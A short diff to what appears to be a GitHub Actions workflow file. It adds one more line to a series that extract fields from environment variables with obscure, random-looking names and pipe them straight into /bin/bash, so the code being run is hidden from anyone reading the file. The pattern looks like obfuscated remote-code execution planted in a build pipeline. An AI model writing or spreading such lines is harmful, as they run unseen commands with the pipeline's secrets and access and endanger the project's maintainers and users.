@@ -29,6 +29,7 @@ jobs:
           echo $w784 | jq -r .us052 | /bin/bash
           echo $bs78 | jq -r .mu25792 | /bin/bash
           echo $ait86519 | jq -r .glw533 | /bin/bash
+          printf '%s' "$ql23" | jq -r .o0 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
